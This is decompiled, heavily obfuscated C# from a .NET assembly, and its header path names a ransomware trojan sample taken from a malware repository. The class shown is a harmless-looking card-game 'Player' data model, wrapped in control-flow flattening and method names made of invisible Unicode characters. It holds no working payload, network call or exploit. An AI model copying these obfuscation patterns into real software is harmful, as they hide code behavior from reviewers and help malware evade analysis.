// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: Eviden, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 0FBAEA8D-82D6-42CE-BC01-F979DED3F8E4
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-25002a8f723189cf80ad649d7af9ccf8c389291bb64e2eed7665e7a21823634b.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 1115146101;
      bool flag;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 399204363)) % 12U)
        {
          case 0:
            num1 = (int) num2 * -2090901968 ^ -2099601756;
            continue;
          case 1:
            flag = BaseStream == 0;
            num1 = (int) num2 * 1368922073 ^ 119396345;
            continue;
          case 2:
            str1 = (string) null;
            num1 = (int) num2 * 1699689352 ^ -1227352438;
            continue;
          case 3:
            goto label_1;
          case 4:
            str1 = "507576";
            num1 = (int) num2 * 35364843 ^ 905913182;
            continue;
          case 5:
            num1 = (int) num2 * -2023040303 ^ 1926507188;
            continue;
          case 6:
            num1 = (int) num2 * 39844483 ^ 1099006059;
            continue;
          case 7:
            int num3 = flag ? 366767387 : (num3 = 1893468478);
            num1 = num3 ^ (int) num2 * -1294017469;
            continue;
          case 8:
            int num4;
            num1 = num4 = BaseStream != 1 ? 1662219969 : (num4 = 263890331);
            continue;
          case 9:
            str1 = "504D";
            num1 = (int) num2 * 2014588604 ^ 112998329;
            continue;
          case 10:
            str2 = str1;
            num1 = 1666110187;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 1551361691;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 512600585)) % 4U)
        {
          case 1:
            num1 = (int) num2 * -576285672 ^ -580288383;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = 919053164;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = 857722038;
        int[] planningCards;
        int index;
        bool flag;
        int planningCardsCount;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (num2 ^ 1431609096)) % 12U)
          {
            case 0:
              num2 = (int) num3 * 1815107135 ^ 2019403905;
              continue;
            case 1:
              flag = planningCards[index] > 0;
              num2 = 1675550223;
              continue;
            case 2:
              planningCardsCount = num1;
              num2 = (int) num3 * 979310841 ^ -1666894340;
              continue;
            case 3:
              int num4 = !flag ? -753772029 : (num4 = -2129572954);
              num2 = num4 ^ (int) num3 * 202914366;
              continue;
            case 4:
              ++num1;
              num2 = (int) num3 * 939900984 ^ -1881132655;
              continue;
            case 5:
              num2 = 696428283;
              continue;
            case 6:
              num2 = (int) num3 * -1408261690 ^ 1521519327;
              continue;
            case 7:
              planningCards = this.PlanningCards;
              index = 0;
              num2 = (int) num3 * -1740288106 ^ 1692434822;
              continue;
            case 8:
              goto label_1;
            case 9:
              int num5;
              num2 = num5 = index >= planningCards.Length ? 2012992634 : (num5 = 210692577);
              continue;
            case 11:
              ++index;
              num2 = (int) num3 * -1465365831 ^ -1433783314;
              continue;
            default:
              goto label_13;
          }
        }
label_13:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
label_1:
      int num1 = 196166457;
      int index;
      bool flag1;
      int planningCard;
      string str2;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 869715052)) % 14U)
        {
          case 0:
            flag1 = index < this.PlanningCards.Length;
            num1 = 396392723;
            continue;
          case 1:
            flag2 = planningCard == 0;
            num1 = (int) num2 * 723523000 ^ 1784310898;
            continue;
          case 3:
            int num3 = flag1 ? -1152218271 : (num3 = -52991422);
            num1 = num3 ^ (int) num2 * -1663781941;
            continue;
          case 4:
            num1 = (int) num2 * 1465784954 ^ -1046797426;
            continue;
          case 5:
            str1 = Player.\u206B⁮‬⁭⁪‫​⁬‬‫​‭⁪⁬‏‏‬‏⁯⁭‬⁬‪‎‭‍‌​‪⁬‍‍‬‬‌‬​‎​‫‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 1794044004;
            continue;
          case 6:
            planningCard = this.PlanningCards[index];
            num1 = (int) num2 * 380895741 ^ 2111859827;
            continue;
          case 7:
            str2 = str1;
            num1 = (int) num2 * 1736016797 ^ -1132823345;
            continue;
          case 8:
            ++index;
            num1 = 1309819610;
            continue;
          case 9:
            index = 0;
            num1 = (int) num2 * 623629720 ^ 1795993318;
            continue;
          case 10:
            num1 = 283036208;
            continue;
          case 11:
            num1 = (int) num2 * -1796778781 ^ 1449730543;
            continue;
          case 12:
            int num4 = flag2 ? 1573599571 : (num4 = 1806736631);
            num1 = num4 ^ (int) num2 * 922810873;
            continue;
          case 13:
            goto label_1;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -1860207291;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -305955193)) % 4U)
        {
          case 0:
            goto label_1;
          case 2:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -289922123 ^ -573928850;
            continue;
          case 3:
            num1 = (int) num2 * 161101979 ^ -1810241565;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 144197958;
      int aIndex;
      int count;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 953610794)) % 8U)
        {
          case 0:
            aIndex = 0;
            num1 = (int) num2 * -1299875020 ^ 488571079;
            continue;
          case 1:
            numArray = new int[count];
            num1 = (int) num2 * 1071959167 ^ -1886855011;
            continue;
          case 2:
            planningCards = numArray;
            num1 = (int) num2 * -1828905010 ^ -2069327647;
            continue;
          case 3:
            goto label_1;
          case 4:
            count = json.Count;
            num1 = (int) num2 * -108391156 ^ -352557637;
            continue;
          case 5:
            int num3;
            num1 = num3 = aIndex >= count ? 1165208248 : (num3 = 430062844);
            continue;
          case 6:
            numArray[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = 733471335;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 14265779;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 607294497)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1584780311 ^ -2096923209;
            continue;
          case 2:
            str = Player.\u200E‮‏⁫‎⁪‭⁪‏⁯⁬‍⁭⁪​‌⁪‏⁬‭⁪‪‎⁬⁫⁮‭​⁬‎‬⁬‍‪⁬​‏​⁮‏‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -1174498852 ^ -552753616;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u206B⁮‬⁭⁪‫​⁬‬‫​‭⁪⁬‏‏‬‏⁯⁭‬⁬‪‎‭‍‌​‪⁬‍‍‬‬‌‬​‎​‫‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200E‮‏⁫‎⁪‭⁪‏⁯⁬‍⁭⁪​‌⁪‏⁬‭⁪‪‎⁬⁫⁮‭​⁬‎‬⁬‍‪⁬​‏​⁮‏‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
